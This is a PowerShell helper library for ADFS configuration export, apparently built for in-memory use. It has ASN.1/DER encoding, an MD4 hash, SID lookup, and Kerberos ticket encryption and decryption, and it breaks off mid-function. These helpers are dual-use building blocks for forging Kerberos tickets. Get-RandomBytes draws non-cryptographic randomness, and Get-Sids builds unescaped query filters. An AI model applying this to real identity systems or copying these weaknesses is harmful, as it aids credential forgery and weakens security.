# ADFS Configuration Export - Standalone Functions
# Extracted for in-memory use


#============================================================
# Source: CommonUtils.ps1
#============================================================

Function Convert-ByteArrayToB64
{

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true,ValueFromPipeline)]
        [Byte[]]$Bytes,
        [Switch]$UrlEncode,
        [Switch]$NoPadding
    )

    $b64 = [convert]::ToBase64String($Bytes);

    if($UrlEncode)
    {
        $b64 = $b64.Replace("/","_").Replace("+","-")
    }

    if($NoPadding -or $UrlEncode)
    {
        $b64 = $b64.Replace("=","")
    }

    return $b64
}

Function Convert-B64ToByteArray
{

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true,ValueFromPipeline)]
        [String]
        $B64
    )
    $B64 = $B64.Replace("_","/").Replace("-","+").TrimEnd(0x00,"=")

    # Fill the header with padding for Base 64 decoding
    while ($B64.Length % 4)
    {
        $B64 += "="
    }

    return [convert]::FromBase64String($B64)
}

Function Convert-ByteArrayToHex
{

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true,ValueFromPipeline)]
        [Byte[]]
        $Bytes
    )

    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)

    ForEach($byte in $Bytes){
        $HexString.AppendFormat("{0:x2}", $byte) | Out-Null
    }

    $HexString.ToString()
}

Function Convert-HexToByteArray
{

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true,ValueFromPipeline)]
        [String]
        $HexString
    )

    $Bytes = [byte[]]::new($HexString.Length / 2)

    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }

    $Bytes
}

# Returns the given number random bytes
function Get-RandomBytes
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [int]$Bytes
    )
    Process
    {
        $returnBytes = New-Object byte[] $Bytes
        

        for($c = 0; $c -lt $Bytes ; $c++)
        {
            $returnBytes[$c] = Get-Random -Minimum 0 -Maximum 0xFF
        }

        return $returnBytes
    }
}

function Parse-Asn1
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data,
        [Parameter(Mandatory=$False)]
        [int]$Pos=0,
        [Parameter(Mandatory=$False)]
        [int]$Level=0
    )
    Begin
    {
        
    }
    Process
    {
        # Must be initialized 
        [int]$p =      $pos
        [int]$sBytes = 0
        [int]$size =   0


        # Get the tag
        [int]$tag = $Data[$p]
        
        if(($Data[$p+1] -shr 4) -eq 8) # Get the size
        {
            # Multibyte
            $sBytes = $Data[$p+1] -band 0x0F
            
            for($a = 1 ; $a -le $sBytes; $a++)
            {
                $size += ($Data[$p+1+$a] * [Math]::Pow(256, $sBytes-$a))
            }
            
            $tSize = $size + 2 +$sBytes
        }
        else
        {
            $size = $Data[$p+1]
            $tSize = $size + 2
        }

        
        # Calculate start and end
        $start = $p
        $end =   $p + $tSize - 1

        # Move to the start of the data        
        $p += 2 + $sBytes

        if(($tag -shr 4) -eq 0x06) # Application element
        { 
                $appNum = $tag -band 0x0F
                $tType = "6{0:X}" -f $appNum

                $multiValue = $true
        }
        elseif(($tag -shr 4) -eq 0x0A) # Sequence element
        { 
                $seqNum = $tag -band 0x0F
                $tType = "A{0:X}" -f $seqNum

                $multiValue = $true
        }
        elseif($tag -in 0x10, 0x30) 
        {
                $tType = "SEQUENCE"
                $multiValue = $true
        } 
        elseif($tag -in 0x11, 0x31) 
        {
                $tType = "SET"
                $multiValue = $true
        }
        else
        {
            $multiValue = $false
            
            switch($tag)
            {
                0x01 {
                        $tType = "BOOLEAN"
                        $tData = $Data[$p-1] -ne 0x00
                        $tValue = $tData

                        break
                }
                0x02 {
                        $tType = "INTEGER" 
                        $tData = 0
                        for($a = 1 ; $a -le $size; $a++)
                        {
                            $tData += $Data[$p-1+$a] * [Math]::Pow(256, $size-$a)
                        }
                        $tValue = $tData
                        
                        break
                        }
                0x03 {
                        $tType = "BIT STRING"
                        $tData = $Data[$p..$($p+$size-1)]
                        $tValue = Convert-ByteArrayToHex -Bytes $tData
                        
                        break
                        }
                0x04 {
                        $tType = "OCTET STRING"
                        Write-Verbose "$(("  " * $level ))$tType ($size) $tValue"
                        $tData = $Data[$p..$($p+$size-1)]
                        
                        break
                        } 
                0x05 {
                        $tType = "NULL"
                        $tData = $null
                        $tValue = $tData

                        break
                        }
                0x06 {
                        $tType = "OBJECT IDENTIFIER"
                        $tData = Convert-BytesToOid -Bytes $Data[$p..$($p+$size-1)]
                        $tValue = $tData

                        break
                        }
                0x0A {
                        $tType = "ENUMERATED"
                        $tData = 0
                        for($a = 1 ; $a -le $size; $a++)
                        {
                            $tData += $Data[$p-1+$a] * [Math]::Pow(256, $size-$a)
                        }
                        $tValue = $tData
                        
                        break
                        }
                0x13 {
                        $tType = "PrintableString"
                        $tData = [text.encoding]::ASCII.GetString($Data[$p..$($p+$size-1)])
                        $tValue = $tData
                        
                        break
                        }
                0x16 {
                        $tType = "IA5String"
                        $tData = [text.encoding]::ASCII.GetString($Data[$p..$($p+$size-1)])
                        $tValue = $tData
                        
                        break
                        }
                0x18 {
                        $tType = "DATE TIME"
                        $dStr = [text.encoding]::UTF8.GetString($Data[$p..$($p+$size-1)])

                        $yyyy = [int]$dStr.Substring(0,4)
                        $MM   = [int]$dStr.Substring(4,2)
                        $dd   = [int]$dStr.Substring(6,2)
                        $hh   = [int]$dStr.Substring(8,2)
                        $min  = [int]$dStr.Substring(10,2)
                        $ss   = [int]$dStr.Substring(12,2)

                        $tData = [DateTime]"$($yyyy)-$('{0:D2}' -f $MM)-$('{0:D2}' -f $dd)T$('{0:D2}' -f $hh):$('{0:D2}' -f $min):$('{0:D2}' -f $ss)Z" 

                        $tValue = $tData

                        break
                        }
                0x1B {
                        $tType = "GENERAL STRING"
                        $tData = [text.encoding]::UTF8.GetString($Data[$p..$($p+$size-1)])
                        $tValue = $tData

                        break
                        }
                0x7B {
                        $tType = "EncAPRepPart"
                        Write-Verbose "$(("  " * $level ))$tType ($size) $tValue"
                        try
                        {
                            $tData = Parse-Asn1 -Data $Data[$p..$($p+$size-1)] -Level ($Level+1)
                        }
                        catch
                        {
                            $tData = $Data[$p..$($p+$size-1)]
                        }
                        break
                    }
                0x7E {
                        $tType = "KRB_ERROR"
                        Write-Verbose "$(("  " * $level ))$tType ($size) $tValue"
                        try
                        {
                            $tData = Parse-Asn1 -Data $Data[$p..$($p+$size-1)] -Level ($Level+1)
                        }
                        catch
                        {
                            $tData = $Data[$p..$($p+$size-1)]
                        }
                        break
                        
                    }
                0x80 {
                        $tType = "APPSPECIFIC"
                        $tData = $Data[$p..$($p+$size-1)]
                        
                        break
                        
                    }
                
                default {

                            Throw "Unknown TAG 0x$('{0:X}' -f  $tag) ($size)"
                        }       
            }
        }

        if($Size -eq 0)
        {
            $tData =  $null
            $tValue = $null
        }

        if(($tag -ne 0x04) -and (($tag -shr 4) -ne 0x07))
        {
            Write-Verbose "$(("  " * $level ))$tType ($size) $tValue"
        }

        if($multiValue)
        {
            $tData = @()
            While($p -lt $end)
            {

                $element = Parse-Asn1 -Data $Data -Pos $p -Level ($Level+1) 

                $p += $element.Size
                $tData += $element
                
                
            }
        
        }
        
                

        return New-Object psobject -Property @{ "Type" = $tType; "Data" = $tData ; "DataLength" = $size; "Size" = $tSize}
    }
}


#============================================================
# Source: md4.ps1
#============================================================

function Get-MD4{
    PARAM(
        [String]$String,
        [Byte[]]$bArray,
        [Switch]$UpperCase,
        [Switch]$AsByteArray # Added by Author Aug 23th 2019
    )
    
    # Author: Larry.Song@outlook.com
    # Reference: https://tools.ietf.org/html/rfc1320
    # MD4('abc'): 
    #     a448017aaf21d8525fc10ae87aa6729d UTF-8
    #     e0fba38268d0ec66ef1cb452d5885e53 Unicode
    $Array = [byte[]]@()
    if($String)
    {
        $Array = [System.Text.Encoding]::Unicode.GetBytes($String) # Edited by Author Nov 16th 2018
    }
    if($bArray)
    {
        $Array = $bArray
    }
    # padding 100000*** to length 448, last (64 bits / 8) 8 bytes fill with original length
    # at least one (512 bits / 8) 64 bytes array
    $M = New-Object Byte[] (([math]::Floor($Array.Count/64) + 1) * 64)
    # copy original byte array, start from index 0
    $Array.CopyTo($M, 0)
    # padding bits 1000 0000
    $M[$Array.Count] = 0x80
    # padding bits 0000 0000 to fill length (448 bits /8) 56 bytes
    # Default value is 0 when creating a new byte array, so, no action
    # padding message length to the last 64 bits
    @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)

    # message digest buffer (A,B,C,D)
    $A = [Convert]::ToUInt32('0x67452301', 16)
    $B = [Convert]::ToUInt32('0xefcdab89', 16)
    $C = [Convert]::ToUInt32('0x98badcfe', 16)
    $D = [Convert]::ToUInt32('0x10325476', 16)
    
    # There is no unsigned number shift in C#, have to define one.
    Add-Type -TypeDefinition @'
public class Shift
{
  public static uint Left(uint a, int b)
    {
        return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
    }
}
'@

    # define 3 auxiliary functions
    function FF([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ((-bnot $X) -band $Z))
    }
    function GG([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
    }
    function HH([uint32]$X, [uint32]$Y, [uint32]$Z){
        ($X -bxor $Y -bxor $Z)
    }
    # processing message in one-word blocks
    for($i = 0; $i -lt $M.Count; $i += 64)
    {
        # Save a copy of A/B/C/D
        $AA = $A
        $BB = $B
        $CC = $C
        $DD = $D

        # Round 1 start
        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)

        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)

        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)

        $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
        $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)
        # Round 1 end
        # Round 2 start
        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

        $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
        $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
        $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)
        # Round 2 end
        # Round 3 start
        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

        $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
        $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
        $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
        $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)
        # Round 3 end
        # Increment start
        $A = ($A + $AA) -band [uint32]::MaxValue
        $B = ($B + $BB) -band [uint32]::MaxValue
        $C = ($C + $CC) -band [uint32]::MaxValue
        $D = ($D + $DD) -band [uint32]::MaxValue
        # Increment end
    }
    # Output start
    $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    # Output end

    
    if($AsByteArray)
    {
        return [byte[]]("$A$B$C$D" -replace '..', '0x$&,' -split ',' -ne '')
    }
    else
    {
        if($UpperCase)
        {
            return "$A$B$C$D".ToUpper()
        }
        else
        {
            return "$A$B$C$D"
        }
    }
}

#============================================================
# Source: Kerberos_utils.ps1
#============================================================

# Gets sids from AD or AAD
function Get-Sids{
    Param(
        [Parameter(Mandatory=$False)]
        [String]$AccessToken,
        [Parameter(Mandatory=$False)]
        [String]$SearchString,
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName
    )
    Process
    {
        # If we got Access Token, search the Azure AD
        if(![String]::IsNullOrEmpty($AccessToken))
        {
            # Get all Azure AD users, filtered users, or just one with userPrincipalName
            $AADUsers = Get-AADUsers -AccessToken $AccessToken -SearchString $SearchString -UserPrincipalName $UserPrincipalName
            $output=@()
            if($AADUsers -ne $null)
            {
                foreach($AADUser in $AADUsers)
                {
                    $properties=@{}
                    $properties.UserPrincipalName = $AADUser.UserPrincipalName
                    
                    $properties.Sid = $AADUser.onPremisesSecurityIdentifier

                    $properties.FullName = $AADUser.displayName
                    
                    $output+=New-Object PSObject -Property $properties
                }
            }
            else
            {
                Write-Error "$UserPrincipalName not found!"
                return
            }
            $output
        }
        else
        {
            # Make the filter if search string is given
            if(![string]::IsNullOrEmpty($SearchString))
            {
                $Filter = "Name LIKE '$SearchString%' or Fullname LIKE '$SearchString%'"

            }
            # If userprincipalname is given, we can't find user with Get-WmiObject so we need to use the DirectorySearcher
            elseif(![string]::IsNullOrEmpty($UserPrincipalName))
            {
                $ADSearch = New-Object System.DirectoryServices.DirectorySearcher
                $ADSearch.Filter="UserPrincipalName=$UserPrincipalName"

                $AADUser=$ADSearch.FindOne()

                if($AADUser -eq $null)
                {
                    Write-Error "$UserPrincipalName not found!"
                    return
                }
                $bSID=$AADUser.Properties.objectsid[0]
                $SID=(New-Object System.Security.Principal.SecurityIdentifier($bSID,0)).Value

                $properties=@{}
                $properties.UserPrincipalName = $UserPrincipalName
                    
                $properties.Sid = $Sid

                $properties.FullName = $AADUser.Properties.displayname[0]

                return New-Object PSObject -Property $properties
            }

            # Query the AD using Get-WmiObject so we don't have to parse each object as with DirectorySearcher
            Get-WmiObject win32_useraccount -Filter $Filter | Where-Object Disabled -eq $false | Select-Object domain,name,fullname,sid
            
        }
    }
}

# Converts bytearray to datetime
# Aug 31st 2019
function DateBytes2Date
{
    Param(
        [Parameter(Mandatory=$True)]
        [Byte[]]$DateBytes
        
    )
    Process
    {
        return [datetime]::FromFileTimeUtc([System.BitConverter]::ToInt64($DateBytes,0))
    }
}

# Converts datetime to bytearray
# Aug 31st 2019
function Date2DateBytes
{
    Param(
        [Parameter(Mandatory=$True)]
        [DateTime]$Date
        
    )
    Process
    {
        return [System.BitConverter]::GetBytes($Date.ToFileTimeUtc())
    }
}

# Converts "20190829080935Z" type of strings to datetime
# Aug 31st 2019
function DateString2Date
{
    Param(
        [Parameter(Mandatory=$True)]
        [String]$DateString
        
    )
    Process
    {
        $y = $DateString.Substring(0,4)
        $m = $DateString.Substring(4,2)
        $d = $DateString.Substring(6,2)
        $h = $DateString.Substring(8,2)
        $mm = $DateString.Substring(10,2)
        $s = $DateString.Substring(12,2)
        $DateString = "$y-$m-$d $h`:$mm`:$s`Z"
        #return Get-Date -Year $y -Month $m -Day $d -Hour $h -Minute $mm -Second $s -Millisecond 0
        return Get-Date -Date $DateString
    }
}

# Converts datetime to "20190829080935Z" type of string
# Aug 31st 2019
function Date2DateString
{
    Param(
        [Parameter(Mandatory=$True)]
        [DateTime]$Date
        
    )
    Process
    {
        return $Date.ToUniversalTime().ToString("yyyyMMddHHmmssZ")
    }
}

# Converts datetime to "20190829080935Z" type of string to bytes
# Aug 31st 2019
function Date2DateStringBytes
{
    Param(
        [Parameter(Mandatory=$True)]
        [DateTime]$Date
        
    )
    Process
    {
        return [text.encoding]::ASCII.GetBytes((Date2DAteString $Date))
    }
}


# Encrypts the kerberos ticket using the given password (=key)
function Encrypt-Kerberos
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$Data,
        [Parameter(Mandatory=$False)]
        [byte[]]$Salt,

        [Parameter(Mandatory=$False)]
        [ValidateSet('Ticket','Authenticator','APRepPart','EncKrbPrivPart')]
        [String]$Type="Ticket",

        [Parameter(Mandatory=$False)]
        [ValidateSet('RC4','AES')]
        [String]$Crypto="RC4"
    )
    Process
    {
        if($Crypto -eq "RC4")
        {
            if(!$Salt)
            {
                if($Type -eq "Ticket")
                {
                    [byte[]]$Salt=@(0x02, 0x00, 0x00, 0x00)
                }
                elseif($Type -eq "Authenticator")
                {
                    [byte[]]$Salt=@(0x0B, 0x00, 0x00, 0x00)
                }
                elseif($Type -eq "APRepPart")
                {
                    [byte[]]$Salt=@(0x0C, 0x00, 0x00, 0x00)
                }
                elseif($Type -eq "EncKrbPrivPart")
                {
                    [byte[]]$Salt=@(0x0D, 0x00, 0x00, 0x00)
                }
                else
                {
                    Throw "Unsupported decryption type"
                }
            }
			 
            $k1=$Key


            # Confounder (8 bytes)
            $stuff = Get-RandomBytes -Bytes 8

            $hmac= [System.Security.Cryptography.HMACMD5]::new($k1)
            $k2=$hmac.ComputeHash($Salt) # Salt

            [byte[]]$plainText = $stuff + $Data
   
            $hmac = [System.Security.Cryptography.HMACMD5]::new($k2)
            $checksum = $hmac.ComputeHash($plainText)

            $k3=$hmac.ComputeHash($checksum)

            [byte[]]$cipherText = Get-RC4 -Key $k3 -Data $plaintext

            [byte[]]$cipherText = $checksum + $cipherText
        }
        else
        {
            $Ke = DK -Key $Key -Usage Ticket -KeyDerivationMode Ke

            # Confounder (16 bytes)
            $stuff = Get-RandomBytes -Bytes 16
            [byte[]]$plainText = $stuff + $Data 

            [byte[]]$cipherText = AES_CTS_Encrypt -PlainText $plainText -Key $Ke 

            # Calculate checksum
            $ki = DK -Key $Key -Usage Ticket -KeyDerivationMode Ki
            $hmacsha1 = [System.Security.Cryptography.HMACSHA1]::new($ki)
            $checksum = ($hmacsha1.ComputeHash($plaintext))[0..11]

            [byte[]]$cipherText = $cipherText+$checksum

        }


        return $cipherText
    }
}

# Decrypts Kerberos data
# Mar 26th 2021
function Decrypt-Kerberos
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$Data,
        [Parameter(Mandatory=$False)]
        [byte[]]$Salt,

        [Parameter(Mandatory=$False)]
        [ValidateSet('Ticket','Authenticator','APRepPart','EncKrbPrivPart')]
        [String]$Type="Ticket",

        [Parameter(Mandatory=$False)]
        [ValidateSet('RC4','AES')]
        [String]$Crypto="RC4"
    )
    Process
    {
        if($Crypto -eq "RC4")
        {
            if(!$Salt)
            {
                if($Type -eq "Ticket")
                {
                    [byte[]]$Salt=@(0x02, 0x00, 0x00, 0x00)
                }
                elseif($Type -eq "Authenticator")
                {
                    [byte[]]$Salt=@(0x0B, 0x00, 0x00, 0x00)
                }
                elseif($Type -eq "APRepPart")
                {
                    [byte[]]$Salt=@(0x0C, 0x00, 0x00, 0x00)
                }
                elseif($Type -eq "EncKrbPrivPart")
                {
                    [byte[]]$Salt=@(0x0D, 0x00, 0x00, 0x00)
                }
                else
                {
                    Throw "Unsupported decryption type"
                }
            }
	 
            $k1=$Key

            $hmac= [System.Security.Cryptography.HMACMD5]::new($k1)
            $k2=$hmac.ComputeHash($Salt) # Salt

            [byte[]]$cipher = $Data[16..$($Data.Count-1)]
   
            $hmac = [System.Security.Cryptography.HMACMD5]::new($k2)
            $checksum = $Data[0..15]

            $k3=$hmac.ComputeHash($checksum)

            [byte[]]$plainText = Get-RC4 -Key $k3 -Data $cipher

            $compare = $hmac.ComputeHash($plainText)

            $plainText = [byte[]]$plainText[8..$($plainText.Count-1)]
        }
        else
        {
            $Ke = DK -Key $Key -Usage Ticket -KeyDerivationMode Ke

            [byte[]]$plainText = AES_CTS_Decrypt -CipherText $Data[0..$($Data.Count - 13)] -Key $Ke 

            # Calculate checksum
            $ki = DK -Key $Key -Usage Ticket -KeyDerivationMode Ki
            $hmacsha1 = [System.Security.Cryptography.HMACSHA1]::new($ki)
            $compare = ($hmacsha1.ComputeHash($plainText))[0..11]
            $checksum = $Data[$($plainText.Count)..$($plainText.Count+12)]

            # Strip the confounder
            $plainText = $plainText[16..($plainText.Count)]
        }


        if(@(Compare-Object $checksum $compare -SyncWindow 0).Length -gt 0)
        {
            Write-Warning "Checksum mismatch"
        }

        return $plainText
    }
}

# Get DER Length Bytes
function Get-DERLengthBytes
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        $length = $Data.Length
        if($length -lt 128)
        {
            return $length
        }
        elseif($length -lt 256)
        {
            # We return 1000 0010 = multibyte (1000), one bytes (0001)
            return @(0x81, $length)
        }
        else
        {
            $secondByte = $length % 256
            $firstByte = ($length - $secondByte)/256
            # We return 1000 0010 = multibyte (1000), two bytes (0010)
            return @(0x82, $firstByte, $secondByte)
        }
    }
}

# Returns given der tag, length bytes, and the given data
function Add-DERTag
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte]$Tag,
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        $output = @($Tag)
        $output += Get-DERLengthBytes($Data)
        $output += $Data
        return $output
    }
}


function Add-DERSet
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        $output = @(0x31)
        $output += Get-DERLengthBytes($Data)
        $output += $Data
        return $output
    }
}
function Add-DERSequence
{
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        $output = @(0x30)
        $output += Get-DERLengthBytes($Data)
        $output += $Data
        return $output
    }
}

function Add-DERUnicodeString
{
    Param(
        [Parameter(Mandatory=$True)]
        [String]$Text,
        [byte]$Tag=0x04,
        [switch]$LE

    )
    Process
    {
        $data = [system.text.encoding]::Unicode.GetBytes($Text)

        # swap the bytes (little-endian)
        if($LE)
        {
            for($a = 0; $a -lt $data.Length ; $a+=2)
            {
                $t=$data[$a]
                $data[$a]=$data[$a+1]
                $data[$a+1]=$t
            }
        }

        $output = @($Tag)
        $output += Get-DERLengthBytes($data)
        $output += $data
        return $output
    }
}

function Add-DERUtf8String
{
